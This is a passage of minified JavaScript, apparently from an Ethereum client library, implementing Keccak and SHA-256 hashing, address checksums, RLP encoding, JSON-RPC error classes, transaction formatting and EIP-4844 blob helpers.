a=0;a<10;a++)t[o+a]^=~r[(a+2)%10]&r[(a+4)%10]}t[0]^=aH[n],t[1]^=cH[n]}r.fill(0)}class n2 extends r2{constructor(e,r,n,i=!1,s=24){if(super(),this.blockLen=e,this.suffix=r,this.outputLen=n,this.enableXOF=i,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,ag(n),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=Qj(this.state)}keccak(){u4||h4(this.state32),lH(this.state32,this.rounds),u4||h4(this.state32),this.posOut=0,this.pos=0}update(e){Hu(this);const{blockLen:r,state:n}=this;e=i1(e);const i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);for(let a=0;a<o;a++)n[this.pos++]^=e[s++];this.pos===r&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:r,pos:n,blockLen:i}=this;e[n]^=r,(r&128)!==0&&n===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Hu(this,!1),Yf(e),this.finish();const r=this.state,{blockLen:n}=this;for(let i=0,s=e.length;i<s;){this.posOut>=n&&this.keccak();const o=Math.min(n-this.posOut,s-i);e.set(r.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return ag(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(PA(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:r,suffix:n,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new n2(r,n,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=n,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}}const uH=(t,e,r)=>kA(()=>new n2(e,t,r)),$A=uH(1,136,256/8);function hH(t,e){const r=e,n=$A(Qf(t,{strict:!1})?SA(t):t);return r==="bytes"?n:Oe(n)}class xc extends Je{constructor({address:e}){super(`Address "${e}" is invalid.`,{metaMessages:["- Address must be a hex value of 20 bytes (40 hex characters).","- Address must match its checksum counterpart."],name:"InvalidAddressError"})}}class s1 extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const r=super.get(e);return super.has(e)&&r!==void 0&&(this.delete(e),super.set(e,r)),r}set(e,r){if(super.set(e,r),this.maxSize&&this.size>this.maxSize){const n=this.keys().next().value;n&&this.delete(n)}return this}}const Nw=new s1(8192);function dH(t,e){if(Nw.has(`${t}.${e}`))return Nw.get(`${t}.${e}`);const r=t.substring(2).toLowerCase(),n=hH(NA(r),"bytes"),i=r.split("");for(let o=0;o<40;o+=2)n[o>>1]>>4>=8&&i[o]&&(i[o]=i[o].toUpperCase()),(n[o>>1]&15)>=8&&i[o+1]&&(i[o+1]=i[o+1].toUpperCase());const s=`0x${i.join("")}`;return Nw.set(`${t}.${e}`,s),s}const fH=/^0x[a-fA-F0-9]{40}$/,Pw=new s1(8192);function Ic(t,e){const{strict:r=!0}=e??{},n=`${t}.${r}`;if(Pw.has(n))return Pw.get(n);const i=fH.test(t)?t.toLowerCase()===t?!0:r?dH(t)===t:!0:!1;return Pw.set(n,i),i}function Xf(t){return`0x${t.reduce((e,r)=>e+r.replace("0x",""),"")}`}function pH(t,e,r,{strict:n}={}){return Qf(t,{strict:!1})?wH(t,e,r,{strict:n}):gH(t,e,r,{strict:n})}function RA(t,e,r){if(ju(t)!==r-e)throw new Tj({offset:r,position:"end",size:ju(t)})}function gH(t,e,r,{strict:n}={}){const i=t.slice(e,r);return n&&RA(i,e,r),i}function wH(t,e,r,{strict:n}={}){const i=`0x${t.replace("0x","").slice(e*2,r*2)}`;return n&&RA(i,e,r),i}class p4 extends Je{constructor({offset:e}){super(`Offset \`${e}\` cannot be negative.`,{name:"NegativeOffsetError"})}}class mH extends Je{constructor({length:e,position:r}){super(`Position \`${r}\` is out of bounds (\`0 < position < ${e}\`).`,{name:"PositionOutOfBoundsError"})}}class yH extends Je{constructor({count:e,limit:r}){super(`Recursive read limit of \`${r}\` exceeded (recursive read count: \`${e}\`).`,{name:"RecursiveReadLimitExceededError"})}}const bH={bytes:new Uint8Array,dataView:new DataView(new ArrayBuffer(0)),position:0,positionReadCount:new Map,recursiveReadCount:0,recursiveReadLimit:Number.POSITIVE_INFINITY,assertReadLimit(){if(this.recursiveReadCount>=this.recursiveReadLimit)throw new yH({count:this.recursiveReadCount+1,limit:this.recursiveReadLimit})},assertPosition(t){if(t<0||t>this.bytes.length-1)throw new mH({length:this.bytes.length,position:t})},decrementPosition(t){if(t<0)throw new p4({offset:t});const e=this.position-t;this.assertPosition(e),this.position=e},getReadCount(t){return this.positionReadCount.get(t||this.position)||0},incrementPosition(t){if(t<0)throw new p4({offset:t});const e=this.position+t;this.assertPosition(e),this.position=e},inspectByte(t){const e=t??this.position;return this.assertPosition(e),this.bytes[e]},inspectBytes(t,e){const r=e??this.position;return this.assertPosition(r+t-1),this.bytes.subarray(r,r+t)},inspectUint8(t){const e=t??this.position;return this.assertPosition(e),this.bytes[e]},inspectUint16(t){const e=t??this.position;return this.assertPosition(e+1),this.dataView.getUint16(e)},inspectUint24(t){const e=t??this.position;return this.assertPosition(e+2),(this.dataView.getUint16(e)<<8)+this.dataView.getUint8(e+2)},inspectUint32(t){const e=t??this.position;return this.assertPosition(e+3),this.dataView.getUint32(e)},pushByte(t){this.assertPosition(this.position),this.bytes[this.position]=t,this.position++},pushBytes(t){this.assertPosition(this.position+t.length-1),this.bytes.set(t,this.position),this.position+=t.length},pushUint8(t){this.assertPosition(this.position),this.bytes[this.position]=t,this.position++},pushUint16(t){this.assertPosition(this.position+1),this.dataView.setUint16(this.position,t),this.position+=2},pushUint24(t){this.assertPosition(this.position+2),this.dataView.setUint16(this.position,t>>8),this.dataView.setUint8(this.position+2,t&255),this.position+=3},pushUint32(t){this.assertPosition(this.position+3),this.dataView.setUint32(this.position,t),this.position+=4},readByte(){this.assertReadLimit(),this._touch();const t=this.inspectByte();return this.position++,t},readBytes(t,e){this.assertReadLimit(),this._touch();const r=this.inspectBytes(t);return this.position+=e??t,r},readUint8(){this.assertReadLimit(),this._touch();const t=this.inspectUint8();return this.position+=1,t},readUint16(){this.assertReadLimit(),this._touch();const t=this.inspectUint16();return this.position+=2,t},readUint24(){this.assertReadLimit(),this._touch();const t=this.inspectUint24();return this.position+=3,t},readUint32(){this.assertReadLimit(),this._touch();const t=this.inspectUint32();return this.position+=4,t},get remaining(){return this.bytes.length-this.position},setPosition(t){const e=this.position;return this.assertPosition(t),this.position=t,()=>this.position=e},_touch(){if(this.recursiveReadLimit===Number.POSITIVE_INFINITY)return;const t=this.getReadCount();this.positionReadCount.set(this.position,t+1),t>0&&this.recursiveReadCount++}};function DA(t,{recursiveReadLimit:e=8192}={}){const r=Object.create(bH);return r.bytes=t,r.dataView=new DataView(t.buffer,t.byteOffset,t.byteLength),r.positionReadCount=new Map,r.recursiveReadLimit=e,r}const cc=(t,e,r)=>JSON.stringify(t,(n,i)=>typeof i=="bigint"?i.toString():i,r),vH={ether:-9,wei:9};function BA(t,e){let r=t.toString();const n=r.startsWith("-");n&&(r=r.slice(1)),r=r.padStart(e,"0");let[i,s]=[r.slice(0,r.length-e),r.slice(r.length-e)];return s=s.replace(/(0+)$/,""),`${n?"-":""}${i||"0"}${s?`.${s}`:""}`}function Py(t,e="wei"){return BA(t,vH[e])}function EH(t){const e=Object.entries(t).map(([n,i])=>i===void 0||i===!1?null:[n,i]).filter(Boolean),r=e.reduce((n,[i])=>Math.max(n,i.length),0);return e.map(([n,i])=>`  ${`${n}:`.padEnd(r+1)}  ${i}`).join(`
`)}class CH extends Je{constructor({v:e}){super(`Invalid \`v\` value "${e}". Expected 27 or 28.`,{name:"InvalidLegacyVError"})}}class AH extends Je{constructor({transaction:e}){super("Cannot infer a transaction type from provided transaction.",{metaMessages:["Provided Transaction:","{",EH(e),"}","","To infer the type, either provide:","- a `type` to the Transaction, or","- an EIP-1559 Transaction with `maxFeePerGas`, or","- an EIP-2930 Transaction with `gasPrice` & `accessList`, or","- an EIP-4844 Transaction with `blobs`, `blobVersionedHashes`, `sidecars`, or","- an EIP-7702 Transaction with `authorizationList`, or","- a Legacy Transaction with `gasPrice`"],name:"InvalidSerializableTransactionError"})}}class xH extends Je{constructor({storageKey:e}){super(`Size for storage key "${e}" is invalid. Expected 32 bytes. Got ${Math.floor((e.length-2)/2)} bytes.`,{name:"InvalidStorageKeySizeError"})}}const i2=t=>t;class Id extends Je{constructor({body:e,cause:r,details:n,headers:i,status:s,url:o}){super("HTTP request failed.",{cause:r,details:n,metaMessages:[s&&`Status: ${s}`,`URL: ${i2(o)}`,e&&`Request body: ${cc(e)}`].filter(Boolean),name:"HttpRequestError"}),Object.defineProperty(this,"body",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"headers",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"status",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"url",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.body=e,this.headers=i,this.status=s,this.url=o}}class LA extends Je{constructor({body:e,error:r,url:n}){super("RPC Request failed.",{cause:r,details:r.message,metaMessages:[`URL: ${i2(n)}`,`Request body: ${cc(e)}`],name:"RpcRequestError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.code=r.code,this.data=r.data}}class g4 extends Je{constructor({body:e,url:r}){super("The request took too long to respond.",{details:"The request timed out.",metaMessages:[`URL: ${i2(r)}`,`Request body: ${cc(e)}`],name:"TimeoutError"})}}const IH=-1;class Qr extends Je{constructor(e,{code:r,docsPath:n,metaMessages:i,name:s,shortMessage:o}){super(o,{cause:e,docsPath:n,metaMessages:i||(e==null?void 0:e.metaMessages),name:s||"RpcError"}),Object.defineProperty(this,"code",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.name=s||e.name,this.code=e instanceof LA?e.code:r??IH}}class yn extends Qr{constructor(e,r){super(e,r),Object.defineProperty(this,"data",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.data=r.data}}class zd extends Qr{constructor(e){super(e,{code:zd.code,name:"ParseRpcError",shortMessage:"Invalid JSON was received by the server. An error occurred on the server while parsing the JSON text."})}}Object.defineProperty(zd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32700});class jd extends Qr{constructor(e){super(e,{code:jd.code,name:"InvalidRequestRpcError",shortMessage:"JSON is not a valid request object."})}}Object.defineProperty(jd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32600});class Hd extends Qr{constructor(e,{method:r}={}){super(e,{code:Hd.code,name:"MethodNotFoundRpcError",shortMessage:`The method${r?` "${r}"`:""} does not exist / is not available.`})}}Object.defineProperty(Hd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32601});class qd extends Qr{constructor(e){super(e,{code:qd.code,name:"InvalidParamsRpcError",shortMessage:["Invalid parameters were provided to the RPC method.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(qd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32602});class qu extends Qr{constructor(e){super(e,{code:qu.code,name:"InternalRpcError",shortMessage:"An internal error was received."})}}Object.defineProperty(qu,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32603});class Vd extends Qr{constructor(e){super(e,{code:Vd.code,name:"InvalidInputRpcError",shortMessage:["Missing or invalid parameters.","Double check you have provided the correct parameters."].join(`
`)})}}Object.defineProperty(Vd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32e3});class Wd extends Qr{constructor(e){super(e,{code:Wd.code,name:"ResourceNotFoundRpcError",shortMessage:"Requested resource not found."}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"ResourceNotFoundRpcError"})}}Object.defineProperty(Wd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32001});class Gd extends Qr{constructor(e){super(e,{code:Gd.code,name:"ResourceUnavailableRpcError",shortMessage:"Requested resource not available."})}}Object.defineProperty(Gd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32002});class Vu extends Qr{constructor(e){super(e,{code:Vu.code,name:"TransactionRejectedRpcError",shortMessage:"Transaction creation failed."})}}Object.defineProperty(Vu,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32003});class Ra extends Qr{constructor(e,{method:r}={}){super(e,{code:Ra.code,name:"MethodNotSupportedRpcError",shortMessage:`Method${r?` "${r}"`:""} is not supported.`})}}Object.defineProperty(Ra,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32004});class Wu extends Qr{constructor(e){super(e,{code:Wu.code,name:"LimitExceededRpcError",shortMessage:"Request exceeds defined limit."})}}Object.defineProperty(Wu,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32005});class Kd extends Qr{constructor(e){super(e,{code:Kd.code,name:"JsonRpcVersionUnsupportedError",shortMessage:"Version of JSON-RPC protocol is not supported."})}}Object.defineProperty(Kd,"code",{enumerable:!0,configurable:!0,writable:!0,value:-32006});class lc extends yn{constructor(e){super(e,{code:lc.code,name:"UserRejectedRequestError",shortMessage:"User rejected the request."})}}Object.defineProperty(lc,"code",{enumerable:!0,configurable:!0,writable:!0,value:4001});class Zd extends yn{constructor(e){super(e,{code:Zd.code,name:"UnauthorizedProviderError",shortMessage:"The requested method and/or account has not been authorized by the user."})}}Object.defineProperty(Zd,"code",{enumerable:!0,configurable:!0,writable:!0,value:4100});class Jd extends yn{constructor(e,{method:r}={}){super(e,{code:Jd.code,name:"UnsupportedProviderMethodError",shortMessage:`The Provider does not support the requested method${r?` " ${r}"`:""}.`})}}Object.defineProperty(Jd,"code",{enumerable:!0,configurable:!0,writable:!0,value:4200});class Qd extends yn{constructor(e){super(e,{code:Qd.code,name:"ProviderDisconnectedError",shortMessage:"The Provider is disconnected from all chains."})}}Object.defineProperty(Qd,"code",{enumerable:!0,configurable:!0,writable:!0,value:4900});class Yd extends yn{constructor(e){super(e,{code:Yd.code,name:"ChainDisconnectedError",shortMessage:"The Provider is not connected to the requested chain."})}}Object.defineProperty(Yd,"code",{enumerable:!0,configurable:!0,writable:!0,value:4901});class Xd extends yn{constructor(e){super(e,{code:Xd.code,name:"SwitchChainError",shortMessage:"An error occurred when attempting to switch chain."})}}Object.defineProperty(Xd,"code",{enumerable:!0,configurable:!0,writable:!0,value:4902});class ef extends yn{constructor(e){super(e,{code:ef.code,name:"UnsupportedNonOptionalCapabilityError",shortMessage:"This Wallet does not support a capability that was not marked as optional."})}}Object.defineProperty(ef,"code",{enumerable:!0,configurable:!0,writable:!0,value:5700});class tf extends yn{constructor(e){super(e,{code:tf.code,name:"UnsupportedChainIdError",shortMessage:"This Wallet does not support the requested chain ID."})}}Object.defineProperty(tf,"code",{enumerable:!0,configurable:!0,writable:!0,value:5710});class rf extends yn{constructor(e){super(e,{code:rf.code,name:"DuplicateIdError",shortMessage:"There is already a bundle submitted with this ID."})}}Object.defineProperty(rf,"code",{enumerable:!0,configurable:!0,writable:!0,value:5720});class nf extends yn{constructor(e){super(e,{code:nf.code,name:"UnknownBundleIdError",shortMessage:"This bundle id is unknown / has not been submitted"})}}Object.defineProperty(nf,"code",{enumerable:!0,configurable:!0,writable:!0,value:5730});class sf extends yn{constructor(e){super(e,{code:sf.code,name:"BundleTooLargeError",shortMessage:"The call bundle is too large for the Wallet to process."})}}Object.defineProperty(sf,"code",{enumerable:!0,configurable:!0,writable:!0,value:5740});class of extends yn{constructor(e){super(e,{code:of.code,name:"AtomicReadyWalletRejectedUpgradeError",shortMessage:"The Wallet can support atomicity after an upgrade, but the user rejected the upgrade."})}}Object.defineProperty(of,"code",{enumerable:!0,configurable:!0,writable:!0,value:5750});class af extends yn{constructor(e){super(e,{code:af.code,name:"AtomicityNotSupportedError",shortMessage:"The wallet does not support atomic execution but the request requires it."})}}Object.defineProperty(af,"code",{enumerable:!0,configurable:!0,writable:!0,value:5760});class SH extends Qr{constructor(e){super(e,{name:"UnknownRpcError",shortMessage:"An unknown RPC error occurred."})}}function gh(t,e="hex"){const r=UA(t),n=DA(new Uint8Array(r.length));return r.encode(n),e==="hex"?Ko(n.bytes):n.bytes}function UA(t){return Array.isArray(t)?NH(t.map(e=>UA(e))):PH(t)}function NH(t){const e=t.reduce((n,i)=>n+i.length,0),r=MA(e);return{length:e<=55?1+e:1+r+e,encode(n){e<=55?n.pushByte(192+e):(n.pushByte(247+r),r===1?n.pushUint8(e):r===2?n.pushUint16(e):r===3?n.pushUint24(e):n.pushUint32(e));for(const{encode:i}of t)i(n)}}}function PH(t){const e=typeof t=="string"?Ac(t):t,r=MA(e.length);return{length:e.length===1&&e[0]<128?1:e.length<=55?1+e.length:1+r+e.length,encode(n){e.length===1&&e[0]<128?n.pushBytes(e):e.length<=55?(n.pushByte(128+e.length),n.pushBytes(e)):(n.pushByte(183+r),r===1?n.pushUint8(e.length):r===2?n.pushUint16(e.length):r===3?n.pushUint24(e.length):n.pushUint32(e.length),n.pushBytes(e))}}}function MA(t){if(t<2**8)return 1;if(t<2**16)return 2;if(t<2**24)return 3;if(t<2**32)return 4;throw new Je("Length is too large.")}class ky extends Je{constructor({cause:e,message:r}={}){var i;const n=(i=r==null?void 0:r.replace("execution reverted: ",""))==null?void 0:i.replace("execution reverted","");super(`Execution reverted ${n?`with reason: ${n}`:"for an unknown reason"}.`,{cause:e,name:"ExecutionRevertedError"})}}Object.defineProperty(ky,"code",{enumerable:!0,configurable:!0,writable:!0,value:3}),Object.defineProperty(ky,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class o1 extends Je{constructor({cause:e,maxFeePerGas:r}={}){super(`The fee cap (\`maxFeePerGas\`${r?` = ${Py(r)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:e,name:"FeeCapTooHighError"})}}Object.defineProperty(o1,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class FA extends Je{constructor({cause:e,maxPriorityFeePerGas:r,maxFeePerGas:n}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${r?` = ${Py(r)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${n?` = ${Py(n)} gwei`:""}).`].join(`
`),{cause:e,name:"TipAboveFeeCapError"})}}Object.defineProperty(FA,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});function s2(t,e){return({exclude:r,format:n})=>({exclude:r,format:i=>{const s=e(i);if(r)for(const o of r)delete s[o];return{...s,...n(i)}},type:t})}const o2=2n**256n-1n,zA={"0x0":"legacy","0x1":"eip2930","0x2":"eip1559","0x3":"eip4844","0x4":"eip7702"};function a2(t){const e={...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,chainId:t.chainId?og(t.chainId):void 0,gas:t.gas?BigInt(t.gas):void 0,gasPrice:t.gasPrice?BigInt(t.gasPrice):void 0,maxFeePerBlobGas:t.maxFeePerBlobGas?BigInt(t.maxFeePerBlobGas):void 0,maxFeePerGas:t.maxFeePerGas?BigInt(t.maxFeePerGas):void 0,maxPriorityFeePerGas:t.maxPriorityFeePerGas?BigInt(t.maxPriorityFeePerGas):void 0,nonce:t.nonce?og(t.nonce):void 0,to:t.to?t.to:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,type:t.type?zA[t.type]:void 0,typeHex:t.type?t.type:void 0,value:t.value?BigInt(t.value):void 0,v:t.v?BigInt(t.v):void 0};return t.authorizationList&&(e.authorizationList=OH(t.authorizationList)),e.yParity=(()=>{if(t.yParity)return Number(t.yParity);if(typeof e.v=="bigint"){if(e.v===0n||e.v===27n)return 0;if(e.v===1n||e.v===28n)return 1;if(e.v>=35n)return e.v%2n===0n?1:0}})(),e.type==="legacy"&&(delete e.accessList,delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas,delete e.yParity),e.type==="eip2930"&&(delete e.maxFeePerBlobGas,delete e.maxFeePerGas,delete e.maxPriorityFeePerGas),e.type==="eip1559"&&delete e.maxFeePerBlobGas,e}const kH=s2("transaction",a2);function OH(t){return t.map(e=>({address:e.address,chainId:Number(e.chainId),nonce:Number(e.nonce),r:e.r,s:e.s,yParity:Number(e.yParity)}))}function _H(t){const e=(t.transactions??[]).map(r=>typeof r=="string"?r:a2(r));return{...t,baseFeePerGas:t.baseFeePerGas?BigInt(t.baseFeePerGas):null,blobGasUsed:t.blobGasUsed?BigInt(t.blobGasUsed):void 0,difficulty:t.difficulty?BigInt(t.difficulty):void 0,excessBlobGas:t.excessBlobGas?BigInt(t.excessBlobGas):void 0,gasLimit:t.gasLimit?BigInt(t.gasLimit):void 0,gasUsed:t.gasUsed?BigInt(t.gasUsed):void 0,hash:t.hash?t.hash:null,logsBloom:t.logsBloom?t.logsBloom:null,nonce:t.nonce?t.nonce:null,number:t.number?BigInt(t.number):null,size:t.size?BigInt(t.size):void 0,timestamp:t.timestamp?BigInt(t.timestamp):void 0,transactions:e,totalDifficulty:t.totalDifficulty?BigInt(t.totalDifficulty):null}}const TH=s2("block",_H);function jA(t){const{kzg:e}=t,r=t.to??(typeof t.blobs[0]=="string"?"hex":"bytes"),n=typeof t.blobs[0]=="string"?t.blobs.map(s=>Ac(s)):t.blobs,i=[];for(const s of n)i.push(Uint8Array.from(e.blobToKzgCommitment(s)));return r==="bytes"?i:i.map(s=>Ko(s))}function HA(t){const{kzg:e}=t,r=t.to??(typeof t.blobs[0]=="string"?"hex":"bytes"),n=typeof t.blobs[0]=="string"?t.blobs.map(o=>Ac(o)):t.blobs,i=typeof t.commitments[0]=="string"?t.commitments.map(o=>Ac(o)):t.commitments,s=[];for(let o=0;o<n.length;o++){const a=n[o],c=i[o];s.push(Uint8Array.from(e.computeBlobKzgProof(a,c)))}return r==="bytes"?s:s.map(o=>Ko(o))}function $H(t,e,r,n){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,r,n);const i=BigInt(32),s=BigInt(4294967295),o=Number(r>>i&s),a=Number(r&s),c=n?4:0,l=n?0:4;t.setUint32(e+c,o,n),t.setUint32(e+l,a,n)}function RH(t,e,r){return t&e^~t&r}function DH(t,e,r){return t&e^t&r^e&r}class BH extends r2{constructor(e,r,n,i){super(),this.blockLen=e,this.outputLen=r,this.padOffset=n,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=Sw(this.buffer)}update(e){Hu(this);const{view:r,buffer:n,blockLen:i}=this;e=i1(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=Sw(e);for(;i<=s-o;o+=i)this.process(c,o);continue}n.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(r,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Hu(this),PA(e,this),this.finished=!0;const{buffer:r,view:n,blockLen:i,isLE:s}=this;let{pos:o}=this;r[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(n,0),o=0);for(let h=o;h<i;h++)r[h]=0;$H(n,i-8,BigInt(this.length*8),s),this.process(n,0);const a=Sw(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,u[h],s)}digest(){const{buffer:e,outputLen:r}=this;this.digestInto(e);const n=e.slice(0,r);return this.destroy(),n}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:r,buffer:n,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%r&&e.buffer.set(n),e}}const LH=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Ys=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Xs=new Uint32Array(64);class UH extends BH{constructor(){super(64,32,8,!1),this.A=Ys[0]|0,this.B=Ys[1]|0,this.C=Ys[2]|0,this.D=Ys[3]|0,this.E=Ys[4]|0,this.F=Ys[5]|0,this.G=Ys[6]|0,this.H=Ys[7]|0}get(){const{A:e,B:r,C:n,D:i,E:s,F:o,G:a,H:c}=this;return[e,r,n,i,s,o,a,c]}set(e,r,n,i,s,o,a,c){this.A=e|0,this.B=r|0,this.C=n|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,r){for(let h=0;h<16;h++,r+=4)Xs[h]=e.getUint32(r,!1);for(let h=16;h<64;h++){const d=Xs[h-15],f=Xs[h-2],g=Ei(d,7)^Ei(d,18)^d>>>3,p=Ei(f,17)^Ei(f,19)^f>>>10;Xs[h]=p+Xs[h-7]+g+Xs[h-16]|0}let{A:n,B:i,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let h=0;h<64;h++){const d=Ei(a,6)^Ei(a,11)^Ei(a,25),f=u+d+RH(a,c,l)+LH[h]+Xs[h]|0,g=(Ei(n,2)^Ei(n,13)^Ei(n,22))+DH(n,i,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=i,i=n,n=f+g|0}n=n+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(n,i,s,o,a,c,l,u)}roundClean(){Xs.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const qA=kA(()=>new UH);function MH(t,e){const r=e,n=qA(Qf(t,{strict:!1})?SA(t):t);return r==="bytes"?n:Oe(n)}function FH(t){const{commitment:e,version:r=1}=t,n=t.to??(typeof e=="string"?"hex":"bytes"),i=MH(e,"bytes");return i.set([r],0),n==="bytes"?i:Ko(i)}function zH(t){const{commitments:e,version:r}=t,n=t.to??(typeof e[0]=="string"?"hex":"bytes"),i=[];for(const s of e)i.push(FH({commitment:s,to:n,version:r}));return i}const w4=6,VA=32,c2=4096,WA=VA*c2,m4=WA*w4-1-1*c2*w4,GA=1;class jH extends Je{constructor({maxSize:e,size:r}){super("Blob size is too large.",{metaMessages:[`Max: ${e} bytes`,`Given: ${r} bytes`],name:"BlobSizeTooLargeError"})}}class KA extends Je{constructor(){super("Blob data must not be empty.",{name:"EmptyBlobError"})}}class HH extends Je{constructor({hash:e,size:r}){super(`Versioned hash "${e}" size is invalid.`,{metaMessages:["Expected: 32",`Received: ${r}`],name:"InvalidVersionedHashSizeError"})}}class qH extends Je{constructor({hash:e,version:r}){super(`Versioned hash "${e}" version is invalid.`,{metaMessages:[`Expected: ${GA}`,`Received: ${r}`],name:"InvalidVersionedHashVersionError"})}}function VH(t){const e=t.to??(typeof t.data=="string"?"hex":"bytes"),r=typeof t.data=="string"?Ac(t.data):t.data,n=ju(r);if(!n)throw new KA;if(n>m4)throw new jH({maxSize:m4,size:n});const i=[];let s=!0,o=0;for(;s;){const a=DA(new Uint8Array(WA));let c=0;for(;c<c2;){const l=r.slice(o,o+(VA-1));if(a.pushByte(0),a.pushBytes(l),l.length<31){a.pushByte(128),s=!1;break}c++,o+=31}i.push(a)}return e==="bytes"?i.map(a=>a.bytes):i.map(a=>Ko(a.bytes))}function WH(t){const{data:e,kzg:r,to:n}=t,i=t.blobs??VH({data:e,to:n}),s=t.commitments??jA({blobs:i,kzg:r,to:n}),o=t.proofs??HA({blobs:i,commitments:s,kzg:r,to:n}),a=[];for(let c=0;c<i.length;c++)a.push({blob:i[c],commitment:s[c],proof:o[c]});return a}function GH(t){if(t.type)return t.type;if(typeof t.authorizationList<"u")return"eip7702";if(typeof t.blobs<"u"||typeof t.blobVersionedHashes<"u"||typeof t.maxFeePerBlobGas<"u"||typeof t.sidecars<"u")return"eip4844";if(typeof t.maxFeePerGas<"u"||typeof t.maxPriorityFeePerGas<"u")return"eip1559";if(typeof t.gasPrice<"u")return typeof t.accessList<"u"?"eip2930":"legacy";throw new AH({transaction:t})}function KH(t,{args:e,eventName:r}={}){return{...t,blockHash:t.blockHash?t.blockHash:null,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,logIndex:t.logIndex?Number(t.logIndex):null,transactionHash:t.transactionHash?t.transactionHash:null,transactionIndex:t.transactionIndex?Number(t.transactionIndex):null,...r?{args:e,eventName:r}:{}}}class a1 extends Je{constructor({chainId:e}){super(typeof e=="number"?`Chain ID "${e}" is invalid.`:"Chain ID is invalid.",{name:"InvalidChainIdError"})}}function ZH(){let t=()=>{},e=()=>{};return{promise:new Promise((r,n)=>{t=r,e=n}),resolve:t,reject:e}}const kw=new 